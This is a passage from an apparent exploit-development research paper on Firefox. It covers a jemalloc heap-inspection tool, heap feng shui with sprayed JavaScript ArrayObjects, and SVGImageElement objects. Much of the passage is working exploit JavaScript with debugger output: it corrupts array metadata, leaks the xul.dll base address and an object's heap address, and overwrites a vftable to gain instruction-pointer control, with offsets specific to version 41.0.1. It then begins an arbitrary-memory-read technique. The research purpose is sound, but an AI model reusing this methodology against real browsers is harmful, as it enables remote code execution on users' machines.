+                                  |    |    |        (debugger-agnostic)
+                                  |    |    |
+                                  |    |    |
+                               +-----------------+
+      +------+                 |                 |
+      |      |---------------> |      shadow     |<-----+
+      | util |        +------> |                 |      |
+      |      |        |        +-----------------+      |
+      +------+        |          ^  ^     ^    ^        |
+        | | |         |          |  |     |    |        |   +--------+
+        | | |   +-----+----------+  |     +----+--------+---| symbol |
+        | | |   |     |             |          |        |   +--------+
+      +-+ | |   |  +----------+     |          |        |   +---------+
+      |   | |   |  | jemalloc |     |          +--------+---| nursery |
+      |   | |   |  +----------+     |                   |   +---------+
+      |   | |   |   ^    ^   ^      |                   |
+      |   | |   |   |    |   |      |                   |
+      |   | |   |   |    |   +------+--------+          |
+      |   | |   |   |    |          |        |          |
+      |   | +---+---+----+----------+--------+-----+    |
+      |   |     |   |    |          |        |     |    |
+      |   +-----+---+----+----+     |        |     |    |
+      |         |   |    |    |     |        |     |    |
+------+---------+---+----+----+-----+--------+-----+----+------------------
+      |         |   |    |    |     |        |     |    |
+      |         |   |    |    |     |        |     |    |     debugger
+      |         |   |    |    |     |        |     |    |  dependent APIs
+      |         |   |    |    |     |        |     |    |
+      |         |   |    |    |     |        |     |    |
+      |         |   |    |    v     |        |     v    |
+      |  +------------+  |  +-------------+  |  +-------------+
+      +->| gdb_engine |  +--| lldb_engine |  +--| pykd_engine |
+         +------------+     +-------------+     +-------------+
+               ^                   ^                   ^
+               |                   |                   |
+           +---+         +---------+   +---------------+
+           |             |             |
+           |             |             |
+-----------+-------------+-------------+-----------------------------------
+           |             |             |
+           |             |             |        debugger-provided backend
+           |             |             |
+           |             |             |
+        +-----+      +------+      +------+
+        | gdb |      | lldb |      | pykd |
+        +-----+      +------+      +------+
+
+---------------------------------------------------------------------------
+
+shadow can help you during Firefox exploit development when you're trying
+to understand the impact of your JavaScript code on the heap. The symbol
+command allows you to search for SpiderMonkey and DOM classes (and
+structures) of specific sizes. This is useful when you're trying to exploit
+use-after-free bugs, or when you want to position interesting victim
+objects to overwrite/corrupt. All the supported commands are:
+
+    0:000> !py c:\\tmp\\shadow\\pykd_driver help
+
+    [shadow] De Mysteriis Dom Firefox
+    [shadow] v1.0b
+
+    [shadow] jemalloc-specific commands:
+    [shadow]   jechunks                : dump info on all available chunks
+    [shadow]   jearenas                : dump info on jemalloc arenas
+    [shadow]   jerun <address>         : dump info on a single run
+    [shadow]   jeruns [-cs]            : dump info on jemalloc runs
+    [shadow]                                 -c: current runs only
+    [shadow]                    -s <size class>: runs for the given size
+    [shadow]                                    class only
+    [shadow]   jebins                  : dump info on jemalloc bins
+    [shadow]   jeregions <size class>  : dump all current regions of the
+    [shadow]                                    given size class
+    [shadow]   jesearch [-cfqs] <hex>  : search the heap for the given hex
+    [shadow]                                    dword
+    [shadow]                                 -c: current runs only
+    [shadow]                                 -q: quick search (less
+    [shadow]                                    details)
+    [shadow]                    -s <size class>: regions of the given size
+    [shadow]                                    only
+    [shadow]                                 -f: search for filled region
+    [shadow]                                    holes)
+    [shadow]   jeinfo <address>        : display all available details for
+    [shadow]                                    an address
+    [shadow]   jedump [filename]       : dump all available jemalloc info
+    [shadow]                                    to screen (default) or file
+    [shadow]   jeparse                 : parse jemalloc structures from
+    [shadow]                                    memory
+    [shadow] Firefox-specific commands:
+    [shadow]   nursery                 : display info on the SpiderMonkey
+    [shadow]                                    GC nursery
+    [shadow]   symbol [-vjdx] <size>   : display all Firefox symbols of the
+    [shadow]                                    given size
+    [shadow]                                 -v: only class symbols with
+    [shadow]                                    vtable
+    [shadow]                                 -j: only symbols from
+    [shadow]                                    SpiderMonkey
+    [shadow]                                 -d: only DOM symbols
+    [shadow]                                 -x: only non-SpiderMonkey
+    [shadow]                                    symbols
+    [shadow]   pa <address> [<length>] : modify the ArrayObject's length
+    [shadow]                                    (default new length 0x666)
+    [shadow] Generic commands:
+    [shadow]   version                 : output version number
+    [shadow]   help                    : this help message
+
+You can find the latest version of shadow, along with installation
+instructions, in the code archive that comes with this paper and also on
+GitHub [SHD]. Just a note; I only had time to test everything on Windows
+and WinDBG. Linux/GDB support is almost complete (though no support for the
+symbol command). I haven't done any work for supporting OS X/LLDB yet. All
+contributions are of course welcome ;)
+
+--[ 5 - Exploitation
+
+In the introduction I set the goal of this paper to be a generic, reusable
+exploitation methodology that can be applied to as many as possible Firefox
+bugs (and bug classes). To be more specific, this high-level goal can be
+broken down into the following:
+
+1) Leak of xul.dll's base address. This DLL is the main one for Firefox and
+it contains the code of both SpiderMonkey and Gecko (Firefox's layout
+engine). This huge DLL contains all the ROP gadgets you may ever want.
+
+2) Leak of the address in Firefox's heap where we have some control due to
+the bug we are exploiting. This can be very useful since we can use it to
+create fake objects with valid addresses that point to data we control.
+
+3) The ability to read any number of bytes from any address we choose, i.e.
+an arbitrary leak.
+
+4) And finally, of course, EIP control (to start a ROP chain, for example).
+
+In order to achieve these we will be using standard JavaScript arrays, i.e.
+ArrayObject jsobjects, as primitives. In the past, researchers have used
+typed arrays for similar purposes [P2O, REN]. However, as we have seen in
+section 2.1, the user-controllable content (data) of typed arrays and their
+metadata (like their length and their data pointer) are no longer
+contiguous in memory. On the other hand, I have found that ArrayObjects can
+be forced to place their metadata next to their data on the jemalloc heap
+and have the following helpful characteristics:
+
+1) We can control their size to multiples of 8 bytes, and also have
+partial control of their contents, both due to the IEEE-754 64-bit jsval
+representation we have seen.
+
+2) We can easily and controllably spray with ArrayObjects from JavaScript.
+
+3) We can move the sprayed ArrayObjects to the jemalloc-managed heap after
+we fill the nursery. Since arrays are jsobjects, when they grow bigger they
+behave according to the way I have already described in section 2.3.
+
+----[ 5.1 - ArrayObjects inside ArrayObjects
+
+Therefore, we spray ArrayObjects as elements of a container ArrayObject;
+when the container becomes large enough, the elements (which are
+themselves ArrayObjects) are moved to the jemalloc heap and bring with them
+their contents and metadata. At js/src/gc/Marking.cpp we can see this in
+the method js::TenuringTracer::moveElementsToTenured() -- excuse the
+annotated with comments pseudocode, see the actual source for the full
+details:
+
+/*
+ * nslots here is equal to the capacity of the ArrayObject plus 2
+ * (ObjectElements::VALUES_PER_HEADER).
+ */
+size_t nslots = ObjectElements::VALUES_PER_HEADER + srcHeader->capacity;
+
+...
+
+if (src->is<ArrayObject>() && nslots <= GetGCKindSlots(dstKind)) {
+  /*
+   * If this is an ArrayObject and nslots is less or equal
+   * to 16 (GetGCKindSlots(dstKind)) there is no new allocation.
+   */
+
+   ...
+
+   return nslots * sizeof(HeapSlot);
+}
+
+...
+
+/*
+ * Otherwise there is a new allocation of size nslots that
+ * goes on the jemalloc heap, the elements are copied, and the
+ * elements_ pointer is set.
+ */
+ dstHeader = \
+ reinterpret_cast<ObjectElements*>(zone->pod_malloc<HeapSlot>(nslots));
+
+js_memcpy(dstHeader, srcHeader, nslots * sizeof(HeapSlot));
+nursery().setElementsForwardingPointer(srcHeader, dstHeader, nslots);
+
+Let's revisit again the example from section 2.3 and present it in the
+context of moving ArrayObjects and their metadata to the jemalloc heap.
+
+...........................................................................
+ +-+            +-++-------+             +-----+        :
+ |T| Temporary  |A|| elems | ArrayObject |     | Free   :        jemalloc
+ | | object     | ||       |  + elements |     | memory :     +-----------+
+ +-+            +-++-------+             +-----+        :     | +-------+ |
+....................................................... :     | | elems | |
+                                                        :     | |       | |
+                                        Before minor GC :     | +-------+ |
+                                        --------------- :     |    ^  ^   |
+  var A = new Array();                                  :     |    |  |   |
+    +----+                                              :     |    |  |   |
+         |  var A[1] = new Array(); // a                :     |    |  |   |
+         |  +                                     +----------------+  |   |
+Next free|  |  ... var A[15] = new Array(); // b  |     :     |       |   |
+   +---+ |  |          +                          |     :     |       |   |
+       | |  |          |    +---------------------+     :     |       |   |
+       v v  v          v    |                           :     |       |   |
+ +-----------------------+  | +-----------------------+ :     |       |   |
+ |+-++-++-++-+         +-+  | |+-++-+                 | :     |       |   |
+ ||T||T||A||a|   ...   |b|+-+ ||J||J|                 | :     |       |   |
+ || || || || |  elems  | |    || || |                 | :     |       |   |
+ |+-++-++-++-+         +-+    |+-++-+                 | :     |       |   |
+ +-----------------------+    +-----------------------+ :     |       |   |
+  Nursery               +      Tenured                  :     |       |   |
+                        |                               :     |       |   |
+                        |                               :     |       |   |
+                        +------------+                  :     |       |   |
+                                     |                  :     |       |   |
+.....................................|................. :     |       |   |
+                                     |                  :     |       |   |
+  Next free                          |  After minor GC  :     |       |   |
+  +-----+                            |  --------------  :     +-------|---+
+  |                                  |                  :             |
+  v                                  v                  :             |
+ +-----------------------+   +-----------------------+  :             |
+ |                       |   |+-++-++-+              |  :             |
+ |                       |   ||J||J||A|+------------------------------+
+ |                       |   || || || |              |  : elements_ pointer
+ |                       |   |+-++-++-+              |  :
+ +-----------------------+   +-----------------------+  :
+  Nursery                     Tenured                   :
+...........................................................................
+
+The above diagram describes what happens to the Firefox heaps when we run
+the following JavaScript code. We create a container ArrayObject; this is
+initially allocated on the nursery. This is A from above.
+
+    var container = new Array();
+
+As we add elements (ArrayObjects) to the container, a minor (nursery)
+garbage collection happens. We trigger this by filling the 16 MBs of the
+nursery with 66000 ArrayObjects of 30 elements each -- remember each
+element is 8 bytes (jsval), but the resulting ArrayObject of size 240 goes
+to the 256-sized jemalloc run (there are also the metadata).
+    
+    // 16777216 / 256 == 65536
+    var spray_size = 66000;
+
+The container ArrayObject (A) is moved from the nursery to the tenured
+heap. If (2 + capacity) >= 17, then each one of the ArrayObject elements of
+the container are re-allocated on the jemalloc heap. Since these are
+ArrayObjects, they have both contents and some metadata. The container
+remains on the tenured heap for the rest of its lifetime.
+
+    for(var i = 0; i < spray_size; i++)
+    {
+        container[i] = new Array();
+
+        for(var j = 0; j < 30; j += 2) // 30 * 8 == 240
+        {
+            container[i][j]     = 0x45464645;
+            container[i][j + 1] = 0x47484847;
+        }
+    }
+
+The careful reader would notice something here. The condition to move an
+object to the jemalloc heap depends on the object's capacity. This sets a
+limit to which jemalloc size categories can be used for our purpose, based
+on the object's initial capacity. If you dig SpiderMonkey's code you will
+find that an ArrayObject with an initlen of 1 (a[0] = "A" for example) has
+a capacity of 6. Therefore, to satisfy the moving condition we have to
+preclude some of the small jemalloc size categories.
+
+At this point let's use the shadow utility from within WinDBG to search the
+jemalloc heap for the content we have sprayed (edited for readability):
+
+    0:000> !py c:\\tmp\\pykd_driver jesearch -s 256 -c 45464645
+
+    [shadow] searching all current runs of size class 256 for 45464645
+    
+    [shadow] found 45464645 at 0x141ad110
+                    (run 0x141ad000, region 0x141ad100, region size 0256)
+    
+    [shadow] found 45464645 at 0x141ad120
+                    (run 0x141ad000, region 0x141ad100, region size 0256)
+    
+    [shadow] found 45464645 at 0x141ad130
+                    (run 0x141ad000, region 0x141ad100, region size 0256)
+
+    0:000> dd 141ad100 l?80
+
+    [ Metadata of a sprayed ArrayObject ]
+              flags    initlen  capacity length
+    141ad100  00000000 0000001e 0000001e 0000001e
+
+    [ Contents of the same sprayed ArrayObject ]
+    141ad110  45464645 ffffff81 47484847 ffffff81
+    141ad120  45464645 ffffff81 47484847 ffffff81
+    ...
+    141ad1e0  45464645 ffffff81 47484847 ffffff81
+    141ad1f0  45464645 ffffff81 47484847 ffffff81
+
+    [ Metadata of another sprayed ArrayObject]
+              flags    initlen  capacity length
+    141ad200  00000000 0000001e 0000001e 0000001e
+
+    [ and its data ]
+    141ad210  45464645 ffffff81 47484847 ffffff81
+    141ad220  45464645 ffffff81 47484847 ffffff81
+
+    0:000> !py c:\\tmp\\pykd_driver jeinfo 141ad200
+    [shadow] address 0x141ad200
+    ...
+    [shadow] run 0x141ad000 is the current run of bin 0x00600608
+
+    [shadow] address 0x141ad200 belongs
+                    to region 0x141ad200 (size class 0256)
+
+We can see above that the ArrayObject elements of the container ArrayObject
+are indeed on the jemalloc heap and specifically on regions of size 256.
+Also, they are contiguous to each other.
+
+----[ 5.2 - jemalloc feng shui
+
+Heap feng shui refers to the manipulation of a heap with the goal of
+carefully arranging it (with selected objects) towards aiding exploitation
+[FSJ]. Armed with the knowledge of the previous sections, we can now:
+
+1) Move our ArrayObjects off the nursery and onto the jemalloc heap along
+with their metadata.
+
+2) Poke holes in the jemalloc runs, and trigger a garbage collection to
+actually make these holes reclaimable by subsequent allocations.
+
+3) Reclaim the holes (since jemalloc is LIFO) and create useful heap
+arrangements.
+
+Assuming we have a heap overflow vulnerability in a specific-sized DOM
+class, we can continue towards implementing our methodology. As an
+example, I will use a typical Firefox DOM class that has a vtable and can
+be allocated easily from JavaScript. Using shadow we can look for such a
+DOM class whose objects have a size of 256 bytes:
+
+    0:000> !py c:\\tmp\\pykd_driver symbol
+    [shadow] usage: symbol [-vjdx] <size>
+    [shadow] options:
+    [shadow]    -v  only class symbols with vtable
+    [shadow]    -j  only symbols from SpiderMonkey
+    [shadow]    -d  only DOM symbols
+    [shadow]    -x  only non-SpiderMonkey symbols
+
+    0:000> !py c:\\tmp\\pykd_driver symbol -dv 256
+    [shadow] searching for DOM class symbols of size 256 with vtable
+    ...
+    [shadow] 0x100 (256) class mozilla::dom::SVGImageElement (vtable: yes)
+
+Continuing from where we left off in section 5.1, after spraying the
+jemalloc heap with ArrayObjects, we free every second allocation to create
+holes. We also trigger a garbage collection to make these holes
+reclaimable.
+
+    for(var i = 0; i < spray_size; i += 2)
+    {
+        delete(container[i]);
+        container[i] = null;
+        container[i] = undefined;
+    }
+
+    var gc_ret = trigger_gc();
+
+We fill these holes with the example vulnerable object we have identified
+above, i.e. mozilla::dom::SVGImageElement. Our assumption is that we have
+a controlled (or semi-controlled) heap overflow in some method of this
+class. We can trigger it either after the instantiation of each object, or
+after the allocation of all objects on a specific one.
+
+    for(var i = 0; i < spray_size; i += 2)
+    {
+        // SVGImageElement is a 0x100-sized object
+        container[i] = \
+        document.createElementNS("http://www.w3.org/2000/svg", "image");
+
+        // trigger the overflow bug here in all allocations, e.g.:
+        // container[i].some_vulnerable_method();
+    }
+
+    // or, trigger the overflow bug here in a specific one, e.g.:
+    // container[1666].some_vulnerable_method();
+
+Using shadow as before we can search for the controlled sprayed content of
+the ArrayObjects and make sure that our heap arrangement has succeeded;
+that is we have ArrayObjects and SVGImageElement objects one after the
+other contiguously on the jemalloc heap. The jerun command outputs a
+textual visualization of the regions of the requested run; their index,
+whether allocated (used) or not, address, and a 4-byte preview of the
+content. 
+
+    0:000> !py c:\\tmp\\pykd_driver jerun 0x15b11000
+    [shadow] searching for run 0x15b11000
+
+    [shadow] [run 0x15b11000] [size 016384] [bin 0x00600608]
+                [region size 0256] [total regions 0063] [free regions 0000]
+
+    [shadow] [region 000] [used] [0x15b11100] [0x0]
+    [shadow] [region 001] [used] [0x15b11200] [0x69e0cf70]
+    [shadow] [region 002] [used] [0x15b11300] [0x0]
+    [shadow] [region 003] [used] [0x15b11400] [0x69e0cf70]
+    ...
+
+Above we can see that the region at 15b11100 is the first region of the
+run, that it is allocated (used), and that its first 4 bytes are zero,
+corresponding to the flags of the ArrayObject. The next region at 15b11200
+has a first dword of 69e0cf70, which is SVGImageElement's vftable pointer.
+
+Let's examine in more detail:
+
+    0:000> dd 15b11100 l?80
+
+    [ Metadata of ArrayObject at region 000 ]
+              flags    initlen  capacity length
+    15b11100  00000000 0000001e 0000001e 0000001e
+
+    [ Contents of the ArrayObject ]
+    15b11110  45464645 ffffff81 47484847 ffffff81
+    15b11120  45464645 ffffff81 47484847 ffffff81
+    ...
+    15b111d0  45464645 ffffff81 47484847 ffffff81
+    15b111e0  45464645 ffffff81 47484847 ffffff81
+    15b111f0  45464645 ffffff81 47484847 ffffff81
+
+    [ SVGImageElement object at region 001 ]
+    15b11200  69e0cf70 69e0eba0 1a590ea0 00000000
+    15b11210  11bfc830 00000000 00020008 00000000
+    15b11220  00000000 00000000 15b11200 00000000
+    15b11230  00000007 00000000 00090000 00000000
+    15b11240  69e0d1f4 00000000 00000000 00000000
+    15b11250  00000000 00000000 69e0bd38 00000000
+    ...
+
+    [ The next ArrayObject starts here, region 002]
+              flags    initlen  capacity length
+    15b11300  00000000 0000001e 0000001e 0000001e
+    15b11310  45464645 ffffff81 47484847 ffffff81
+    15b11320  45464645 ffffff81 47484847 ffffff81
+    ...
+
+    [ The SVGImageElement object at region 003 ]
+    15b11400  69e0cf70 69e0eba0 1a590ea0 00000000
+    ...
+
+    0:000> dds 15b11200  
+    15b11200  69e0cf70 xul!mozilla::dom::SVGImageElement::`vftable'
+
+We have indeed managed to arrange the heap the way we wanted. The next
+step is to search for the ArrayObject whose metadata we have corrupted via
+the assumed SVGImageElement overflow bug. The following code snippet
+assumes that we have overwritten all the metadata (16 bytes) and have used
+0x666 as the new value for initlen, capacity and length.
+
+    var pwned_index = 0;
+
+    for(var i = 0; i < spray_size; i += 2)
+    {
+        if(container[i].length > 500)
+        {
+            var pwnstr = "[*] corrupted array found at index: " + i;
+            log(pwnstr);
+
+            pwned_index = i;
+            break;
+        }
+    }
+
+Our corrupted ArrayObject now allows us to index the corresponding
+JavaScript array beyond its end, and into the neighboring SVGImageElement
+object. Since we have sprayed arrays of length 30 (0x1e), we can index into
+the first 8 bytes of the SVGImageElement object as a jsval of type double
+at index 30 (since at index 29 is the last element of the array).
+
+    0:000> dd 15b11300 l?80
+
+    [ Corrupted metadata of an ArrayObject ]
+              flags    initlen  capacity length
+    15b11300  00000000 00000666 00000666 00000666
+
+              [    index 0    ] [   index 1     ]
+    15b11310  45464645 ffffff81 47484847 ffffff81
+
+              [    index 2    ] [   index 3     ]
+    15b11320  45464645 ffffff81 47484847 ffffff81
+    ...
+    15b113c0  45464645 ffffff81 47484847 ffffff81
+    15b113e0  45464645 ffffff81 47484847 ffffff81
+
+              [    index 28   ] [   index 29    ]
+    15b113f0  45464645 ffffff81 47484847 ffffff81
+
+              [    index 30   ] [   index 31    ]
+    15b11400  69e0cf70 69e0eba0 1a590ea0 00000000
+
+    15b11410  11bfc830 00000000 00020008 00000000
+
+                                [   index 35    ]
+    15b11420  00000000 00000000 15b11400 00000000
+    15b11430  00000007 00000000 00090000 00000000
+    ...
+    15b114e0  e4000201 00000000 00000000 e4010301
+    15b114f0  06000106 00000001 00000000 e5e50000
+
+    0:000> g
+    [*] corrupted array found at index: 31147
+
+----[ 5.3 - xul.dll base leak and our location in memory
+
+We can read from index 30 above, but remember that because we are using an
+array to do so, the two 32-bit values there are going to be treated as a
+double jsval (since the one 32-bit value that corresponds to the type of
+the 64-bit jsval is less than 0xFFFFFF80). Therefore, we need to implement
+two helper functions; one to read the 64-bit value as a double and convert
+it to the corresponding raw bytes (named double_to_bytes()), and one to
+convert the raw bytes to their hexadecimal representation (named
+bytes_to_hex()). Reading from index 30 gives us a vftable pointer of
+SVGImageElement and we simply need to subtract from it the known non-ASLRed
+pointer from xul.dll.
+
+    var val_hex = \
+        bytes_to_hex(double_to_bytes(container[pwned_index][30]));
+
+    var known_xul_addr = 0x121deba0; // 41.0.1 specific
+    var leaked_xul_addr = parseInt(val_hex[1], 16);
+    var aslr_offset = leaked_xul_addr - known_xul_addr;
+    var xul_base = 0x10000000 + aslr_offset;
+
+    var val_str = \
+        "[*] leaked xul.dll base address: 0x" + xul_base.toString(16);
+
+    log(val_str);
+
+In the SVGImageElement object at address 15b11428 above, indexed with our
+corrupted array at index 35, there is a pointer to the start of the object
+itself (15b11400). Such pointers exist in most (if not all, I haven't
+checked them all automatically) Firefox DOM objects for garbage collection
+purposes. By leaking this address from index 35 of our corrupted array, we
+can learn the location of all these objects in the jemalloc heap. This can
+be very helpful for creating fake but valid objects (as we will doing in
+the sections below).
+
+    val_hex = \
+        bytes_to_hex(double_to_bytes(container[pwned_index][35]));
+
+    val_str = "[*] victim SVGImageElement object is at: 0x" + val_hex[0];
+    log(val_str);
+
+Again we use the two helper functions for reading double jsvals and
+converting them to hexadecimal.
+
+In WinDBG the output is (edited for readability):
+
+    0:000> g
+    [*] corrupted array found at index: 31147
+    [*] leaked xul.dll base address: 0x67c30000
+    [*] victim SVGImageElement object is at: 0x15b11400
+
+    Breakpoint 0 hit
+    
+    eax=002cf801 ebx=1160b8b0 ecx=00000001 edx=00000002 esi=697f1386
+    edi=00000000 eip=697f1386 esp=0038cce0 ebp=0038cd6c iopl=0
+    nv up ei pl nz na po nc
+    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b efl=00000202
+    
+    xul!js::math_asin:
+    697f1386 push    ebp
+
+    0:000> lm m xul
+    start    end        module name
+    67c30000 6a162000   xul        
+
+Indeed we can verify with WinDBG's lm command that we have leaked the base
+of xul.dll correctly. Also we now know the address of our victim
+SVGImageElement object. The complete code for this is in file
+'svg-leak.html' in the archive.
+
+----[ 5.4 - EIP control
+
+Our corrupted ArrayObject can of course also be used for writing memory. In
+order to get EIP control, we can simply overwrite a vftable pointer of the
+SVGImageElement object and then call one of its methods. The exact values
+we have to add to or subtract from the leaked SVGImageElement object
+address depend on the method we are calling (and the version of xul.dll).
+
+    var obj_addr = \
+        parseInt(val_hex[0], 16); // our location in memory, see above
+
+    var deref_addr = obj_addr - 0x1f4 + 0x4; // 41.0.1 specific
+    var target_eip = "41424344";
+
+    var write_val_bytes = \
+        hex_to_bytes(target_eip + deref_addr.toString(16));
+
+    var write_val_double = bytes_to_double(write_val_bytes);
+    container[pwned_index][30] = write_val_double;
+
+    log("[*] calling a method of the corrupted SVGImageElement object");
+
+    for(var i = 0; i < spray_size; i += 2)
+    {
+        container[i].setAttribute("height", "100");
+    }
+
+Since we don't know the exact index of SVGImageElement object we have
+corrupted, we call a method of all the objects we have sprayed.
+
+After we have overwritten SVGImageElement's vftable, in WinDBG the
+situation looks like the following:
+
+    0:000> dd 15b11300 l?80
+
+    [ Corrupted metadata of an ArrayObject ]
+              flags    initlen  capacity length
+    15b11300  00000000 00000666 00000666 00000666
+
+              [    index 0    ] [   index 1     ]
+    15b11310  45464645 ffffff81 47484847 ffffff81
+
+              [    index 2    ] [   index 3     ]
+    15b11320  45464645 ffffff81 47484847 ffffff81
+    ...
+    15b113c0  45464645 ffffff81 47484847 ffffff81
+    15b113e0  45464645 ffffff81 47484847 ffffff81
+
+              [    index 28   ] [   index 29    ]
+    15b113f0  45464645 ffffff81 47484847 ffffff81
+
+              [    index 30   ] [   index 31    ]
+    15b11400  15b11210 41424344 1a590ea0 00000000
+
+    15b11410  11bfc830 00000000 00020008 00000000
+
+                                [   index 35    ]
+    15b11420  00000000 00000000 15b11400 00000000
+    15b11430  00000007 00000000 00090000 00000000
+    ...
+    15b114e0  e4000201 00000000 00000000 e4010301
+    15b114f0  06000106 00000001 00000000 e5e50000
+
+    0:000> g
+    [*] calling a method of the corrupted SVGImageElement object
+
+    (1084.a60): Access violation - code c0000005 (first chance)
+    First chance exceptions are reported before any exception handling.
+    This exception may be expected and handled.
+    
+    eax=15b11210 ebx=00000001 ecx=15b11400 edx=00000006 esi=1160b8b0
+    edi=15b11400 eip=41424344 esp=0032d2f0 ebp=0032d520 iopl=0
+    nv up ei pl zr na pe nc
+    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b  efl=00010246
+    
+    41424344 je  41424346                                         [br=1]
+
+We have EIP control, know the base of xul.dll, and can place arbitrary
+content on the heap at known addresses, therefore it is quite simple at
+this point to ROP our way to whatever makes us happy. See the file
+'svg-eip-control.html' for the complete code.
+
+----[ 5.5 - Arbitrary memory leak
+
+Although we have achieved total control over the Firefox process, let's
+look at something that requires more fine-grained control over the jemalloc
+heap. To demonstrate how jemalloc can be manipulated in detail, I will be
+describing how we can achieve the ability to read any number of bytes from
+any address we choose, i.e. an arbitrary memory leak.
+
+For this purpose I will be using a constructed (i.e. fake) non-inline
+string. In order to be able to read back from this fake string, I will
+also need to create a fake string-type jsval that points to the fake
+non-inline string, and index this jsval via the corrupted ArrayObject. The
+problem with this approach is that the corrupted ArrayObject cannot be used
+to write a fake string-type jsval (or any other jsval); remember that
+there is no IEEE-754 64-bit double that corresponds to a 32-bit encoded
+value greater than 0xFFF00000. This is required since in order to create a
+fake jsval string we need to write ffffff85 as its tag value (see the
+discussion on strings in section 2.1 if you are confused at this point).
+
+So, we need to find another way to construct a fake string-type jsval in
+controlled memory. What we can use is the reliability and the LIFO
+operation of jemalloc to create a more complex heap arrangement that will
+help us solve this problem. Specifically, I will add typed arrays to the
+methodology to utilize their fully controlled content. Although, as we have
+seen, I cannot place the metadata of a typed array in memory reachable by
+user-controlled data, the actual data of a typed array (which are
+controlled to byte granularity) can be placed on jemalloc runs.
+
+We start by spraying with ArrayObjects the 256-sized jemalloc runs. Again,
+we have to bypass the nursery and move our objects to jemalloc, so the
+size of our spray is 16777216 / 256 == 65536 arrays.
+
+    var spray_size = 66000;
+    var container = new Array();
+
+    for(var i = 0; i < spray_size; i++)
+    {
+        container[i] = new Array();
+
+        for(var j = 0; j < 30; j += 2) // 30 * 8 == 240 bytes
+        {
+            container[i][j]     = 0x45464645;
+            container[i][j + 1] = 0x47484847;
+        }
+    }
+
+This time, instead of creating a hole every other allocation, we create two
+holes for every ArrayObject we leave on the jemalloc heap. We also trigger
+a GC to make the holes reclaimable.
+
+    for(var i = 0; i < spray_size; i += 3)
+    {
+        delete(container[i]);
+        container[i] = null;
+        container[i] = undefined;
+
+        delete(container[i + 1]);
+        container[i + 1] = null;
+        container[i + 1] = undefined;
+    }
+
+    var gc_ret = trigger_gc();
+
+Let's assume at this point that we have a breakpoint and look at how the
+jemalloc 256-sized runs look like:
+
+    0:043> !py c:\tmp\pykd_driver jeruns -s 256
+    [shadow] listing allocated non-current runs for size class 256
+    [shadow] [total non-current runs 446]
+    
+    [shadow] [run 0x0e507000] [size 016384] [bin 0x00700608]
+        [region size 0256] [total regions 0063] [free regions 0000]
+
+    ...
+
+    [shadow] [run 0x11d03000] [size 016384] [bin 0x00700608]
+        [region size 0256] [total regions 0063] [free regions 0042]
+
+    [shadow] [run 0x15f09000] [size 016384] [bin 0x00700608]
+        [region size 0256] [total regions 0063] [free regions 0042]
+
+    [shadow] [run 0x15f0d000] [size 016384] [bin 0x00700608]
+        [region size 0256] [total regions 0063] [free regions 0042]
+
+    [shadow] [run 0x15f11000] [size 016384] [bin 0x00700608]
+        [region size 0256] [total regions 0063] [free regions 0042]
+
+    [shadow] [run 0x15f15000] [size 016384] [bin 0x00700608]
+        [region size 0256] [total regions 0063] [free regions 0042]
+
+    [shadow] [run 0x15f19000] [size 016384] [bin 0x00700608]
+        [region size 0256] [total regions 0063] [free regions 0042]
+
+    ...
+
+Looking at one of these runs (in random) with shadow we see:
+
+    0:000> !py c:\tmp\pykd_driver jerun 0x15f15000
+    [shadow] searching for run 0x15f15000
+    
+    [shadow] [run 0x15f15000] [size 016384] [bin 0x00700608]
+        [region size 0256] [total regions 0063] [free regions 0042]
+
+    [shadow] [region 000] [free] [0x15f15100] [0xe5e5e5e5]
+    [shadow] [region 001] [free] [0x15f15200] [0xe5e5e5e5]
+    [shadow] [region 002] [used] [0x15f15300] [0x0]
+    [shadow] [region 003] [free] [0x15f15400] [0xe5e5e5e5]
+    [shadow] [region 004] [free] [0x15f15500] [0xe5e5e5e5]
+    [shadow] [region 005] [used] [0x15f15600] [0x0]
+    [shadow] [region 006] [free] [0x15f15700] [0xe5e5e5e5]
+    [shadow] [region 007] [free] [0x15f15800] [0xe5e5e5e5]
+    [shadow] [region 008] [used] [0x15f15900] [0x0]
+    [shadow] [region 009] [free] [0x15f15a00] [0xe5e5e5e5]
+    [shadow] [region 010] [free] [0x15f15b00] [0xe5e5e5e5]
+    ...
+
+Our hole punching has worked. Remember that e5e5e5e5 is the value used by
+Firefox for the sanitization of freed jemalloc regions. The used regions
+with the value 0x0 as their first dword are the ArrayObjects we have left
+on the heap.
+
+We now reclaim these holes on the jemalloc heap with one SVGImageElement
+object and one Uint32Array typed array after each ArrayObject. We make
+sure the content of this typed array is of size 256 bytes so it goes on
+the jemalloc run we are targeting. At this point the actual content of the
+typed array doesn't matter.
+
+    for(var i = 0; i < spray_size; i += 3)
+    {
+        container[i] = \
+        document.createElementNS("http://www.w3.org/2000/svg", "image");
+
+        container[i + 1] = new Uint32Array(64);
+
+        for(var j = 0; j < 64; j++) // 64 * 4 == 256
+        {
+            container[i + 1][j] = 0x51575751;
+        }
+    }
+
+Now, the same run from above looks like:
+
+    0:000> !py c:\tmp\pykd_driver jerun 0x15f15000
+    [shadow] searching for run 0x15f15000
+    
+    [shadow] [run 0x15f15000] [size 016384] [bin 0x00700608]
+        [region size 0256] [total regions 0063] [free regions 0000]
+
+    [shadow] [region 000] [used] [0x15f15100] [0x69e0cf70]
+    [shadow] [region 001] [used] [0x15f15200] [0x51575751]
+    [shadow] [region 002] [used] [0x15f15300] [0x0]
+    [shadow] [region 003] [used] [0x15f15400] [0x69e0cf70]
+    [shadow] [region 004] [used] [0x15f15500] [0x51575751]
+    [shadow] [region 005] [used] [0x15f15600] [0x0]
+    [shadow] [region 006] [used] [0x15f15700] [0x69e0cf70]
+    [shadow] [region 007] [used] [0x15f15800] [0x51575751]
+    [shadow] [region 008] [used] [0x15f15900] [0x0]
+    [shadow] [region 009] [used] [0x15f15a00] [0x69e0cf70]
+    [shadow] [region 010] [used] [0x15f15b00] [0x51575751]
+    ...
+    [shadow] [region 014] [used] [0x15f15f00] [0x0]
+    [shadow] [region 015] [used] [0x15f16000] [0x69e0cf70]
+    [shadow] [region 016] [used] [0x15f16100] [0x51575751]
+
+    0:000> dd 0x15f15f00 l?90
+
+    [ ArrayObject ]
+    15f15f00  00000000 0000001e 0000001e 0000001e
+    15f15f10  45464645 ffffff81 47484847 ffffff81
+    15f15f20  45464645 ffffff81 47484847 ffffff81
+    15f15f30  45464645 ffffff81 47484847 ffffff81
+    15f15f40  45464645 ffffff81 47484847 ffffff81
+    15f15f50  45464645 ffffff81 47484847 ffffff81
